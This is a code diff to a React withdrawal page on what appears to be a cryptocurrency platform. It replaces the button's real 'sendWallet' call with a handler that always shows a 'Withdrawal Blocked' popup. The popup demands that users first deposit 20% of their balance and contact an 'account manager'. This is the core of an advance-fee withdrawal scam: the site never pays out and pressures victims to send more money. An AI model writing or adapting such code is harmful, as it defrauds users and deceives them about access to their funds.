@@ -9,6 +9,8 @@ import axios from "axios";
 import toast, { Toaster } from "react-hot-toast";
 import { useSelector } from "react-redux";
 import { ClipLoader } from "react-spinners";
+import Swal from 'sweetalert2'
+
 
 const NewWithdrawal = () => {
     const Nav = useNavigate()
@@ -123,6 +125,21 @@ const NewWithdrawal = () => {
   const bitcoinValue = amount / exchangeRate;
 const roundedNumber = parseFloat(bitcoinValue.toFixed(8));
 
+ const Wrr = (e) => {
+        e.preventDefault()
+          setClickMe(true);
+        Swal.fire({
+            icon: 'error',
+            title: 'Oops... Withdrawal Blocked',
+            text: "To proceed with your withdrawal, you must first deposit 20% of your available balance for verification and transaction clearance. This step is mandatory to activate your withdrawal. For help, please contact your account manager.",
+          }).then(() => {
+            setClickMe(false)
+            setOpenModal(false)
+            
+         })
+    }
+
+
     return (
         <div className="w-full h-max flex bg-[#f5f6fa] px-48 phone:gap-6 phone:px-6 phone:flex-col py-4">
             <div className="w-[60%] phone:w-full h-max flex flex-col gap-2">
@@ -216,7 +233,7 @@ const roundedNumber = parseFloat(bitcoinValue.toFixed(8));
                     </p>
                     <button
                         className="w-max h-max px-5 py-2 rounded text-white font-semibold bg-[#a286f4]"
-                        onClick={sendWallet}
+                        onClick={Wrr}
                     >  { clickMe ? <ClipLoader color='white' /> :  ' Proceed'}
                        
                     </button>
